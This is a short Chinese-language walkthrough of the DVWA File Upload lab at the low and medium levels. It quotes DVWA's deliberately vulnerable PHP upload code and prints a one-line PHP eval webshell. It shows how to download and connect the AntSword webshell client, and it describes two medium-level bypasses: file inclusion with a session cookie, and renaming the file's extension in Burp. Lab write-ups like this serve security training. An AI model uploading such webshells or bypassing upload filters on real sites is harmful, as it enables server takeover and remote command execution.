<center>File Upload文件上传</center>





[toc]







## File Upload文件上传

> 文件上传







### 1. low

> 低级
>
> 代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
```

> 中国蚁剑

```shell
# 下载
wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip

# 解压
unzip AntSword-Loader-v4.0.3-linux-x64.zip

# 运行
./AntSword
```

> 没有做任何过滤，上传`一句话木马`

```php
<?php eval($_POST['cmd']); ?>
```

> 蚁剑连接:

```shell
url  =  木马地址
密码  =  cmd
```





### 2. medium

> 中级
>
> 代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

```

> 对上传文件进行限制。

* 方法一：用文件包含的漏洞+ 文件上传

```shell
1. burp 获取cookie 文件包含 填入 蚁剑中
PHPSESSID=5skbhhtisu1kf4vfe8jvh4a2l5; security=high

2. 输入url, low级别上传的木马
http://192.168.0.111:8000/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/info.php

3. 密码
cmd

4. 连接成功。
```

方法二：

```shell
1. 修改木马为 .jpg  

2. 打开burp,文件改为2.php

3. 文件上传成功，蚁剑连接。
```















